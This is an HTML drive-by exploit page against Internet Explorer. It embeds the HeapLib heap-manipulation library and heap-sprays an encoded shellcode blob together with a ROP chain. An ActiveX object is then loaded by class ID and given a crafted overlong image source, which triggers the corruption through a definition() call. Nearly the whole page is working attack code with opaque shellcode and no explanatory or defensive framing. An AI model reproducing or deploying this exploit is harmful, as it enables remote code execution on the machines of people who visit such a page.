<html>
<head>
<script>
//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


function randomblock(blocksize)
{
	var theblock = "";
	for (var i = 0; i < blocksize; i++)
	{
		theblock += Math.floor(Math.random()*90)+10;
	}
	return theblock;
}

function tounescape(block)
{
	var blocklen = block.length;
	var unescapestr = "";
	for (var i = 0; i < blocklen-1; i=i+4)
	{
		unescapestr += "%u" + block.substring(i,i+4);
	}
	return unescapestr;
}

var heap_obj = new heapLib.ie(0x10000);

var rop = unescape("%u0c0c%u0c0c%u7f98%u7c34%u6541%u7c37%u8b05%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u653d%u7c37%u1000%u0000%u7f98%u7c34%u15a2%u7c34%uffff%uffff%u6402%u7c37%u5255%u7c34%u2174%u7c35%u4f87%u7c34%u0040%u0000%ud201%u7c34%ub001%u7c38%u7f97%u7c34%ua151%u7c37%u8c81%u7c37%u5c30%u7c34");
var code = unescape("%u979b%u4640%u8cbe%u7feb%uf523%u418d%u6624%u1498%ud687%u7035%u793d%ub40c%u2f90%u48a9%u8342%ub3fd%u96b1%u2c2d%u0593%u9904%ub24b%u3974%u34e3%u91b8%u1cbb%u7c71%ufe11%ud5c0%u3776%u6715%u47b6%ud428%u0dbf%u25b0%ub749%uba4a%u6b9f%ub5f8%u3d72%u797c%u3a7b%u09e2%u9fd6%ub343%u4e4f%u7537%uf513%u197a%u4ae0%u99b8%u7376%ub14b%u2493%u2505%ubf67%uf980%u7472%u7d0c%uf810%u8846%u18e1%u27d5%ub9b4%u8615%uebf7%ub041%ua934%uff69%uc7c6%ue3c1%u4735%u92bb%ub6a8%ub5b7%u2a78%u8dfd%u0d91%ud438%uba66%u4896%u3f3c%u971d%ub290%u2d9b%u1c49%u772f%u7170%ube42%u7e40%u1404%u7f98%ufc30%u7f2c%u707b%uf50a%u7a76%u727c%u737e%ub04f%u7796%u667d%u3237%u67f9%ue285%u1a0d%u2dd6%u7199%u4a40%ub83d%u14ba%uf884%u90b2%u471d%ue189%u4e24%u78b4%ueb3b%u1c46%ubfa8%u4393%ube15%u34b5%u0375%u98fc%ub3b9%ufd08%u74a9%ub72f%u972c%u8d0c%u2049%u79e3%u254b%ub191%u929b%u3fbb%u423c%u0527%ud422%u4104%u029f%ue0d0%ub635%u3348%u8dd5%u3d7b%ueb12%u1b40%u24d4%u811d%u73e0%u4734%ua8b9%u96be%u7fba%u0b4a%ue2d2%u992f%ub246%ue301%u911c%u2b75%ud2d1%u19fc%ue1f7%ub72c%u6615%ubf93%u6779%ud61a%u0370%ub6f9%u8837%u74fd%u277d%ub80c%u4392%u7e72%u3c78%ub0b3%u424e%ub1bb%u9b90%u4b0d%u2d25%u3f04%u7a48%u3577%u7114%u4976%u974f%u05b5%ud569%u2998%u9ff8%u41b4%u3a7c%ua9f5%u7067%u0c76%u14a9%u7e7f%u914b%u4879%u7d98%u3c75%u9634%u66a8%ubb97%u7846%u4347%ub42c%uf887%u1b74%u92d5%uf989%ub3b9%u21b7%u71e1%u4f72%ufc28%ub0b1%u993f%u8d25%u2d93%ub635%u1c7b%ub2b8%ue08c%u4077%u4e4a%u1db5%u6bba%u9fd6%u04be%u9b41%uf50b%ufd23%uc138%u73e2%u023d%ubfd4%u9015%u8342%u09eb%u49e3%u2f37%u7a27%u7c24%u850d%u70e0%u0571%u08b5%u75f5%u7273%ufd13%u8db2%u9099%u0c92%u11be%u78e1%ue332%u047c%u0537%u3441%u919b%u81a9%u4fe2%uf922%u277d%ub63f%u7fa8%u4274%ud60a%u2c66%u7640%u2577%ub11c%u9f43%u18b3%ub8fc%uc010%u4beb%u3b2f%u14f8%u7e96%u7b79%ub40d%ub949%u4767%u7abf%u352d%u4e71%u7bba%ud439%u7db0%ue32a%u7a4a%u7f24%u983d%u1d70%u3173%u15e2%ud086%u3ceb%u79b7%u7248%ud52b%u9793%u017c%ud3f6%u46e0%ubfbb%u3776%u2c78%u7449%u771d%u3f43%ub842%u4abe%ub167%ud620%uf912%ub291%u2475%u923c%u9027%u8d93%u46b5%ue1bb%ua90d%u041c%ub448%u3515%u4197%u84b0%u30fc%uf5fd%u339f%u7ef8%u4f14%u98b3%u9b34%u9605%u3db7%u25b9%u8040%u0cd4%u66a8%uba4b%u2d2f%ud599%u4eb6%uda47%ud9db%u2474%ubff4%ua634%ub7e1%u315a%ub1c9%u8349%u04c2%u7a31%u0315%u157a%u53d6%u5f1d%u9c9f%ua0de%u15ff%u913b%u412d%u804f%u01e1%u291d%u448a%ubab6%u40fe%u0bb9%ub6b4%u8cf4%u7779%u4e5a%u0b18%u83a1%u32fa%ud66a%u73fb%u1997%u2ca9%u88d3%u585d%u10a1%u8e5c%u29ad%uab26%udd72%ub29c%u4ea2%ufdab%ue45a%uddf3%u295b%u22e0%u4615%ud1d2%u8ea4%u192b%uee97%u24e7%ue317%u61f6%u1c90%u998d%ua1e2%u5995%u7d98%u7c10%uf53a%ua482%udaba%u2e54%u97b0%u6813%u26d5%u02f0%ua3e1%uc4f7%uf763%uc0d3%ua328%u507a%u0295%u8283%ufa71%uc821%uef90%u9353%udcfc%u2c69%u4afd%u5ffa%ud5cf%uc850%u9d63%u0f7e%ub483%u9fc6%u377a%u8936%u63b8%ua166%u0c69%u31ed%ud995%u61a1%ub239%ud201%u62f9%u38e9%u5df6%u4309%uf5dc%ub9a3%u39b7%uc59b%ud2d7%uc9d9%u7ec6%u2f54%u6e82%ue730%u163b%u7319%ud7dd%uf9b4%u5cdd%ufd3a%u9490%ued37%u5545%u4f02%u6ac3%ufab9%ufeec%uad45%u96bb%u8847%u388c%uffb8%uf186%u402c%ufdf1%u40a0%ua801%u40aa%u0c69%u128e%u538c%u071b%uc61d%u7ea3%u41f1%u7ccb%ua52c%u7e54%u371b%ua9a9%ubd62%udfdb%u7d86");
var nops_90 = unescape("%u4ed4%u9137");

while (nops_90.length < 0x80000) nops_90 += nops_90;

var offset_length = 1532;

for (var i=0; i < 0x1000; i++) {
	var padding = unescape(tounescape(randomblock(0x1000)));
	while (padding.length < 0x1000) padding+= padding;
	var junk_offset = padding.substring(0, offset_length - code.length);
	var single_sprayblock = code + junk_offset + rop + nops_90.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
	while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
	sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
	heap_obj.alloc(sprayblock);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="QeKw"></object>
<script>
var obj = document.getElementById('QeKw').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(433);
</script>
</body>
</html>
